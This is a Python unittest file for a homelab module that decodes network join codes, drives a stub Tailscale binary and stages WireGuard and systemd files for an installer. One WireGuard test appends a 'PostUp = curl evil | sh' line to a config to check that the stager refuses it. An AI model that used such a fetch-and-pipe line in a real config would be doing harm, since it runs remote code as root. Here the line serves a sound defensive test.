"""Reach it from anywhere (reach.py): the join bundle, joining this machine with a stand-in Tailscale,
and the installer's step against a stand-in installer (a fake root it stages into).

    PYTHONPATH=lib:../lib python -m unittest test_reach
"""
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import textwrap
import unittest
from unittest import mock

from bromigos_homelab import reach as R

KEY = "hskey-auth-FIXTUREfixtureFIXTUREfixture_0123456789"
WG = textwrap.dedent("""\
    [Interface]
    PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=
    Address = 10.9.0.2/32

    [Peer]
    PublicKey = xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=
    Endpoint = vpn.example.org:51820
    AllowedIPs = 10.9.0.0/24
""")


class Bundle(unittest.TestCase):
    def test_round_trip(self):
        b = R.encode("https://net.example.org/", KEY, name="Home", tags=["tag:server"], expires="2099-01-01T00:00:00Z")
        self.assertTrue(b.startswith("bromigos-net:1:"))
        d = R.decode("  here it is: " + b + "\n")
        self.assertEqual((d["server"], d["key"], d["name"], d["tags"]), ("https://net.example.org", KEY, "Home", ["tag:server"]))
        self.assertIn("at net.example.org", R.describe(d))

    def test_the_printed_command_works_too(self):
        for text in (f"sudo tailscale up --login-server https://net.example.org --auth-key {KEY}",
                     f"tailscale up --login-server=https://net.example.org --authkey={KEY}"):
            self.assertEqual(R.decode(text)["key"], KEY)

    def test_refusals(self):
        cases = [("", "Paste the join code"), ("hello", "isn't a join code"),
                 ("bromigos-net:1:!!!!", "isn't a join code"),
                 (R.PREFIX + "eyJ2IjoyfQ", "newer bromigOS"),
                 (f"tailscale up --login-server http://net.example.org --auth-key {KEY}", "needs https"),
                 (f"tailscale up --login-server https://u:p@net.example.org --auth-key {KEY}", "user name"),
                 ("tailscale up --login-server https://net.example.org --auth-key short", "isn't complete"),
                 (R.encode("https://net.example.org", KEY, expires="2001-01-01T00:00:00Z"), "expired")]
        for text, words in cases:
            with self.assertRaises(R.BundleError, msg=text) as e:
                R.decode(text)
            self.assertIn(words, str(e.exception))

    def test_http_only_at_home(self):
        for url in ("http://192.168.1.20:8080", "http://labbox.local:8080", "http://headscale:8080", "http://10.0.0.5"):
            self.assertEqual(R.check_server(url), url)

    def test_found_bundles(self):
        tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, tmp)
        good = R.encode("https://net.example.org", KEY)
        toml = os.path.join(tmp, "homelab.toml")
        with open(toml, "w") as f:
            f.write(f'[network]\nlogin_server = "https://net.example.org"\njoin_bundle = "{good}"\n')
        drop = os.path.join(tmp, "drop")
        with open(drop, "w") as f:
            f.write("not a bundle")
        with mock.patch.dict(os.environ, {"BROMIGOS_HOMELAB_CONFIG": toml, "BROMIGOS_REACH_BUNDLE": good}), \
                mock.patch.object(R, "PAIRING_DROP", drop), mock.patch.object(R, "FIELDKIT_RUN", tmp):
            found = R.find_bundles()
        self.assertEqual(found, [("given to this command", good)], "one bundle once; the bad drop is left out")


STUB = r"""#!/usr/bin/env python3
import json, os, sys
args = sys.argv[1:]
log = os.environ["STUB_LOG"]
if args[:1] == ["up"]:
    ref = next(a for a in args if a.startswith("--auth-key="))[len("--auth-key="):]
    key = open(ref[len("file:"):]).read() if ref.startswith("file:") else None
    mode = oct(os.stat(ref[len("file:"):]).st_mode & 0o777) if key else None
    json.dump({"args": args, "key": key, "mode": mode}, open(log, "w"))
    answer = os.environ.get("STUB_ANSWER", "")
    if answer:
        print(answer, file=sys.stderr)
        sys.exit(1)
elif args[:2] == ["ip", "-4"]:
    print("100.64.0.7")
"""


class JoinNow(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp)
        self.stub = os.path.join(self.tmp, "tailscale")
        with open(self.stub, "w") as f:
            f.write(STUB)
        os.chmod(self.stub, 0o755)
        self.log = os.path.join(self.tmp, "log.json")
        self.keys = os.path.join(self.tmp, "keys")
        os.makedirs(self.keys)

    def join(self, answer="", **kw):
        env = {"BROMIGOS_TAILSCALE": f"{sys.executable} {self.stub}", "STUB_LOG": self.log, "STUB_ANSWER": answer,
               "BROMIGOS_REACH_KEYDIR": self.keys}
        with mock.patch.dict(os.environ, env):
            out = R.join_now(R.encode("https://net.example.org", KEY), **kw)
        with open(self.log) as f:
            return out, json.load(f)

    def test_joins_with_the_key_in_a_file(self):
        out, seen = self.join(hostname="lab box 1")
        self.assertTrue(out["ok"])
        self.assertEqual(out["ip"], "100.64.0.7")
        self.assertEqual(seen["key"], KEY)
        self.assertEqual(seen["mode"], "0o600")
        self.assertFalse(any(KEY in a for a in seen["args"]), "the key is never on a command line")
        for a in ("--login-server=https://net.example.org", "--exit-node=", "--advertise-routes=",
                  "--advertise-exit-node=false", "--accept-routes=false", "--reset", "--hostname=lab-box-1"):
            self.assertIn(a, seen["args"])
        self.assertNotIn("--force-reauth", seen["args"])
        self.assertEqual(os.listdir(self.keys), [], "the key file is removed")

    def test_plain_words_when_it_fails(self):
        out, _ = self.join("backend error: invalid key: authkey already used")
        self.assertFalse(out["ok"])
        self.assertIn("used or expired", out["words"])
        out, _ = self.join("can't change --login-server without --force-reauth")
        self.assertTrue(out["needs_force"])
        out, seen = self.join(force=True)
        self.assertIn("--force-reauth", seen["args"])


class InstallerStep(unittest.TestCase):
    """The installer's side, with a stand-in installer: it shows CHOICES, takes the answer, adds the
    packages to the install and calls stage() on the new system's root."""

    def setUp(self):
        self.root = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.root)

    def path(self, p):
        return os.path.join(self.root, p.lstrip("/"))

    def stand_in_installer(self, answer, hostname="box"):
        packages = ["base", "bromigos-server"]
        choice = R.CHOICE[answer["mode"]]
        packages += [p for p in choice["packages"] if p not in packages]
        result = R.stage(self.root, answer, hostname)
        self.assertEqual(result["packages"], choice["packages"])
        return packages, result

    def test_the_choices(self):
        self.assertEqual([c["id"] for c in R.CHOICES], ["brodec", "lab-network", "wireguard", "tailscale"])
        self.assertTrue(R.CHOICES[0]["default"])
        self.assertEqual(R.CHOICE["tailscale"]["account"], "Tailscale", "the one that needs an account says so")
        self.assertIn("Tailscale (the company)", R.CHOICE["tailscale"]["words"])
        self.assertTrue(R.CHOICE["wireguard"]["advanced"])
        out = subprocess.run([sys.executable, "-m", "bromigos_homelab.reach", "choices", "--json"], capture_output=True,
                             text=True, check=True, env=dict(os.environ))
        self.assertEqual(json.loads(out.stdout)[1]["title"], "Join my lab's private network")

    def test_lab_network_joins_at_first_start(self):
        b = R.encode("https://net.example.org", KEY, name="Home")
        packages, result = self.stand_in_installer({"mode": "lab-network", "bundle": b})
        self.assertIn("tailscale", packages)
        key = self.path(R.KEY_PATH)
        self.assertEqual(open(key).read().strip(), KEY)
        self.assertEqual(stat.S_IMODE(os.stat(key).st_mode), 0o600)
        unit = open(self.path("/etc/systemd/system/" + R.UNIT)).read()
        self.assertIn("--login-server=https://net.example.org --auth-key=file:/etc/bromigos/reach/authkey", unit)
        self.assertIn("--exit-node= --advertise-exit-node=false --advertise-routes= --hostname=box", unit)
        self.assertIn("ExecStopPost=/usr/bin/rm -f /etc/bromigos/reach/authkey", unit)
        wants = self.path("/etc/systemd/system/multi-user.target.wants")
        self.assertEqual(os.readlink(os.path.join(wants, "tailscaled.service")), "/usr/lib/systemd/system/tailscaled.service")
        self.assertEqual(os.readlink(os.path.join(wants, R.UNIT)), "/etc/systemd/system/" + R.UNIT)
        state = json.load(open(self.path(R.STATE_PATH)))
        self.assertEqual(state, {"mode": "lab-network", "login_server": "https://net.example.org", "name": "Home"})
        self.assertNotIn(KEY, open(self.path(R.STATE_PATH)).read())
        self.assertIn("at its first start", result["words"])

    def test_a_bad_bundle_stops_before_writing(self):
        with self.assertRaises(R.BundleError):
            R.stage(self.root, {"mode": "lab-network", "bundle": "nope"})
        self.assertEqual(os.listdir(self.root), [])

    def test_wireguard(self):
        packages, _ = self.stand_in_installer({"mode": "wireguard", "wireguard": WG})
        self.assertIn("wireguard-tools", packages)
        conf = self.path("/etc/wireguard/wg0.conf")
        self.assertEqual(stat.S_IMODE(os.stat(conf).st_mode), 0o600)
        link = self.path("/etc/systemd/system/multi-user.target.wants/wg-quick@wg0.service")
        self.assertEqual(os.readlink(link), "/usr/lib/systemd/system/wg-quick@.service")
        with self.assertRaises(R.BundleError):
            R.stage(self.root, {"mode": "wireguard", "wireguard": WG + "PostUp = curl evil | sh\n"})

    def test_tailscale_service(self):
        _, result = self.stand_in_installer({"mode": "tailscale"})
        self.assertFalse(os.path.exists(self.path(R.KEY_PATH)))
        self.assertIn("sign in to your Tailscale account", result["words"])
        self.stand_in_installer({"mode": "tailscale", "tailscale_key": "tskey-auth-kAbCdEf1CNTRL-0123456789abcdef"})
        unit = open(self.path("/etc/systemd/system/" + R.UNIT)).read()
        self.assertNotIn("--login-server", unit, "Tailscale's own service is the default server")

    def test_brodec_only_changes_nothing_else(self):
        _, result = self.stand_in_installer({"mode": "brodec"})
        self.assertEqual(result["files"], [R.STATE_PATH])
        self.assertEqual(result["enabled"], [])

    def test_the_command_line_the_installer_runs(self):
        answer = os.path.join(self.root, "..", os.path.basename(self.root) + "-answer.json")
        with open(answer, "w") as f:
            json.dump({"mode": "lab-network", "bundle": R.encode("https://net.example.org", KEY)}, f)
        self.addCleanup(os.unlink, answer)
        out = subprocess.run([sys.executable, "-m", "bromigos_homelab.reach", "stage", "--root", self.root, "--answer",
                              answer, "--hostname", "box", "--json"], capture_output=True, text=True, env=dict(os.environ))
        self.assertEqual(out.returncode, 0, out.stderr)
        self.assertEqual(json.loads(out.stdout)["packages"], ["tailscale"])

    def test_the_question_in_a_terminal(self):
        b = R.encode("https://net.example.org", KEY)
        said = []
        answers = iter(["2", b])
        with mock.patch.object(R, "find_bundles", return_value=[]):
            got = R.choose(say=said.append, ask=lambda _q: next(answers))
        self.assertEqual(got, {"mode": "lab-network", "bundle": b})
        self.assertIn("  1. Through BRODEC only  (the default)", said)
        self.assertIn("  4. Tailscale's service  needs a Tailscale account", said)
        answers = iter(["2", ""])
        with mock.patch.object(R, "find_bundles", return_value=[("from the Field Kit stick's lab connection", b)]):
            got = R.choose(say=said.append, ask=lambda _q: next(answers))
        self.assertEqual(got["bundle"], b, "Enter takes the stick's join code")


if __name__ == "__main__":
    unittest.main()
